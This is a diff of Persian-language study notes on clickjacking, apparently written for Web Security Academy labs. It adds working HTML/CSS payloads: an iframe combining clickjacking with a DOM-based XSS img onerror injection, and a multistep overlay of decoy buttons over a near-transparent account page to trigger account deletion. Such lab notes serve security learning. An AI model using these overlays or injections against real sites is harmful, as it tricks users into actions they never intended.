@@ -35,6 +35,32 @@
 - **ترکیب با DOM-based XSS**
   - در اینحالت payload عه XSS را درون فیلد Name قرار می دهیم:
 ```HTML
-<iframe src="$url?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+<iframe src="https://ac321fc21fb2c80cc035160b00f20003.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
 ```
-- س
+- **کلیک چند مرحله ای**
+  - در اینحالت پس از کلیک کاربر بر روی *Delete Account* یک سوال تائید به کاربر نمایش داده می شود و دو باره باید کلیک کند.
+  - باید دو جا برای کلیک کاربر ایجاد کنیم و مشخص کنیم که با چه ترتیبی بر روی کلید های کلیک کند، که کد ان به صورت زیر خواهد بود:
+```HTML
+<style>
+   iframe {
+       position:relative;
+       width:500px;
+       height: 700px;
+       opacity: 0.1;
+       z-index: 2;
+   }
+   .firstClick, .secondClick {
+       position:absolute;
+       top:495px;
+       left:50px;
+       z-index: 1;
+   }
+   .secondClick {
+       top:290px;
+       left:210px;
+   }
+</style>
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+<iframe src="https://ac221f9c1edf7ad8c03e127600c20051.web-security-academy.net/my-account"></iframe>
+```
